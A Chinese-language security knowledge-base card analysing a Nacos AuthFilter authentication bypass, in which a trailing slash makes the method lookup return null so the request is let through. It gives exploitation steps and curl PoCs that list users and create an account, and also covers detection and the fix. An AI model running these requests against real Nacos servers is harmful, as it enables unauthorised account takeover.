---
id: web-java-component-nacos-authfilter-trailing-slash-uri-lookup-bypass
title: Nacos AuthFilter 末尾斜杠绕过：ControllerMethodsCache 取不到 method 时直接放行请求
type: scenario
domain: web
path: web/java/component
technique: nacos-authfilter-trailing-slash-method-null-bypass
tags:
- nacos
- java
- auth-bypass
- path-parsing
- uri
- component
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:05:46+08:00'
  notes: 已对照原文与全部35张图核对：ControllerMethodsCache.getMethod用httpMethod+path查urlLookup（图22）、@RequestMapping均不以斜杠结尾（图21）、method==null时chain.doFilter放行（图8/20）、补丁改为抛NacosRuntimeException(NOT_FOUND,Invalid URI)（图23）均一致。已修正POST PoC为/v1/auth/users/（原文POST行未带斜杠，按末尾斜杠绕过原理补上），并将'源码环境复现'改为'源码分析并给出PoC响应'。未验证点：未实际请求目标。
url: /docs/web/java/component/web-java-component-nacos-authfilter-trailing-slash-uri-lookup-bypass/
draft: false
kb_aliases:
- Nacos 末尾斜杠绕过
- Nacos /v1/auth/users/ 未授权
- ControllerMethodsCache getMethod null
- Nacos AuthFilter URI 路径绕过
- CVE-2021-29441 末尾斜杠（原文归类）
---

## 一句话结论

Nacos 的 `AuthFilter` 在 `method == null` 时直接 `chain.doFilter` 放行；而 `ControllerMethodsCache.getMethod` 用 `request.getMethod() + ":" + path.replaceFirst(contextPath, "")` 去 `urlLookup` 里查 `RequestMappingInfo`，所有 Nacos 的 `@RequestMapping` 都不以 `/` 结尾，因此请求路径末尾多加一个斜杠（如 `/nacos/v1/auth/users/?pageNo=1`）就查不到 method，鉴权被跳过，用户列表/创建用户等接口未授权可用。

## 原理

- `AuthFilter.doFilter` 的核心逻辑：先判断鉴权开关与 UA 白名单，再 `Method method = methodsCache.getMethod(req); if (method == null) { chain.doFilter(request, response); return; }`，之后才检查 `@Secured` 注解并验证 token。也就是说，“找不到对应 Controller 方法”被视为无需鉴权。
- `ControllerMethodsCache.getMethod` 先 `getPath(request)`：`new URI(request.getRequestURI()).getPath()` 原样保留末尾斜杠；随后构造 `urlKey = httpMethod + REQUEST_PATH_SEPARATOR + path.replaceFirst(EnvUtil.getContextPath(), ...)`，从 `ConcurrentHashMap<String, List<RequestMappingInfo>> urlLookup` 取候选。
- `urlLookup` 的键在启动扫描时由 `@RequestMapping` 路径生成，而 Nacos 所有 `@RequestMapping` 值都不以 `/` 结尾（原文截图列举 `*/push/state`、`*/server/status` 等）。因此 `/v1/auth/users/` 与 `/v1/auth/users` 不是同一个键，查不到 method，返回 null。
- 外层 `method == null` 条件成立，AuthFilter 放行；请求继续进入 Spring MVC，而 Spring 自身对尾部斜杠通常做匹配/重定向，最终仍落到 `AuthController` 的 users 接口，于是未授权成功。
- 之所以成立：鉴权层与路由层使用了两套不一致的路径规范化规则——鉴权用精确字符串查表，路由用框架匹配；攻击者只需构造一个“鉴权查不到、路由能命中”的路径。
- 边界：需要目标版本存在该 `method == null → 放行` 逻辑；若补丁改为在 `getPath` 解析异常或路径不匹配时抛 `NacosRuntimeException(NOT_FOUND, "Invalid URI")`，该绕过失效；另外路径必须以真实存在的 Controller 为落点（尾部斜杠形式）。

## 触发条件

- 目标 Nacos 版本存在 `AuthFilter` 的 `method == null` 放行分支（原文基于 1.4.1 源码分析并给出 PoC 响应；公开资料将该路径问题与 CVE-2021-29441 的修复绕过相关联）。
- 鉴权已开启，但请求路径可被构造成末尾带 `/` 且在 Spring MVC 仍匹配到目标接口。
- 攻击者能访问 Nacos API（8848 或反代 `/nacos`）。
- 仅用于授权测试。

## 利用步骤

1. 确认鉴权开启：请求 `/nacos/v1/auth/users?pageNo=1&pageSize=9` 返回 403 `unknown user!`。
2. 在路径末尾加斜杠后重试：`GET /nacos/v1/auth/users/?pageNo=1&pageSize=9`。若返回用户列表，说明鉴权被跳过。
3. 同样对创建用户接口加斜杠：`POST /nacos/v1/auth/users/`，表单 `username=test&password=test`，返回创建成功。
4. 再次用带斜杠的 GET 查看用户列表，确认新用户出现；用新账号登录控制台。
5. 若目标同时配置了 UA 白名单/identity，先关闭这些因素的干扰（原文在 `userAgentAuthWhite=false` 且配置 identity 的环境下验证该路径绕过仍然有效）。
6. 记录请求路径与响应作为证据。

## PoC

```bash
# 查看用户列表
curl -XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9'

# 创建新用户（末尾斜杠触发 method==null 绕过；原文 POST 行未带斜杠，按其原理补上）
curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users/?username=test&password=test'

# 再次查看，确认新增
curl -XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&pageSize=9'
```

响应示例（节选）：

```json
{
  "totalCount": 2,
  "pageNumber": 1,
  "pagesAvailable": 1,
  "pageItems": [
    {"username": "nacos", "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"},
    {"username": "test", "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"}
  ]
}
```

说明：原文将本绕过放在“CVE-2021-29441”章节；公开 CVE-2021-29441 的主体是 `User-Agent: Nacos-Server` 绕过，本卡聚焦末尾斜杠导致的鉴权/路由路径不一致，不把 CVE 归属作为唯一结论。

## 变体与关联

- **其它路径规范化差异**：`//`、`/./`、`%2f`、大小写、分号参数等在不同框架中也可能造成“鉴权层与路由层解析不一致”，本质相同。
- **控制器方法缓存缺失**：其它使用“路径查表 + null 即放行”的鉴权实现也有同类问题，审计时可搜索 `getMethod(...) == null` 后直接 `chain.doFilter`。
- **UA 绕过**：`User-Agent: Nacos-Server` 是另一条分支（已有卡覆盖）。
- **identity 头**：serverIdentity 匹配后同样直接放行，见 [[web-java-component-nacos-server-identity-header-auth-bypass]]。
- **默认 JWT 密钥**：见 [[web-java-component-nacos-default-token-secret-key-jwt-forge]]。
- 关联：[[web-java-component-nacos-default-auth-disabled-user-admin]]。

## 检测与防御

- **检测**：Nacos 访问日志中出现 `/v1/auth/users/`、`/v1/cs/.../` 等带末尾斜杠的管理接口请求，且来源无合法 token；鉴权失败与成功请求路径仅差一个 `/`。
- **防御**：升级到修复版本；补丁方向是在 `getPath` 解析异常/路径不匹配时抛 `NacosRuntimeException(NOT_FOUND, "Invalid URI")`，而不是返回 null 让上层放行；鉴权层应使用与路由层一致的规范化路径，并对 `method == null` 默认拒绝（fail closed）。
- **注意**：不要把“找不到 Controller”当作无需鉴权；默认拒绝比默认放行安全。
